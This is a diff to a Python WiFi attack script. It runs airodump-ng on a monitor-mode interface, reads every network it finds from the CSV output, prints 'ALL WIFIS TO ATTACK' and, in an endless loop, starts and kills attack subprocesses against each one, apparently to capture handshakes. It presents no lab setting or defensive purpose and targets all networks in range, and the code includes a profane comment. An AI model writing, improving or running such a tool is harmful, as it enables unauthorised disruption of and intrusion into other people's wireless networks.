@@ -7,12 +7,10 @@ import threading
 
 def monmode():
   global intface
-  print("Running wlan0")
-  intface = "wlan0"
+  print("Running wlan0mon")
+  intface = "wlan0mon"
 monmode()
 # FUCK BRO MY BACKHURTS FROM TRYING TO FIGURE OUT HOW THE FUCKING RESCAN THREAD WAS FUCKING UP TO LEGIT SO LONG 
-def rescan():
- time.sleep(30)
 
 def handshake():
  os.system("rm -rf pwn-01.csv")
@@ -20,8 +18,8 @@ def handshake():
  names = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
  pwn = subprocess.Popen(["sudo", "airodump-ng", "-w", "pwn", "--write-interval", "1", "--output-format", "csv", f"{intface}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
  os.system("clear")
- print("\033[0;42mSCANNING ALL NETWORKS THEN TARGETING... PLEASE WAIT 5seconds...\033[0m")
- time.sleep(10) # um
+ print("\033[0;42mSCANNING ALL NETWORKS THEN TARGETING... PLEASE WAIT 3seconds...\033[0m")
+ time.sleep(3) # um
  pwn.terminate()
  seen_essids = set()
  os.system("clear")
@@ -31,8 +29,10 @@ def handshake():
  print("\r                       ALL WIFIS TO ATTACK ")
  print("\r   ATTACKING")
  print("\r\033[0;33m -------------\r")
+ 
  time.sleep(3)
- with open("pwn-01.csv", "r") as read_csv:
+ while True:
+  with open("pwn-01.csv", "r") as read_csv:
     sec_read = csv.DictReader(read_csv, names)
     next(sec_read)
     for rows in sec_read: 
@@ -53,4 +53,5 @@ def handshake():
         time.sleep(10)
         term.terminate()
         term2.terminate()
+        
 handshake()
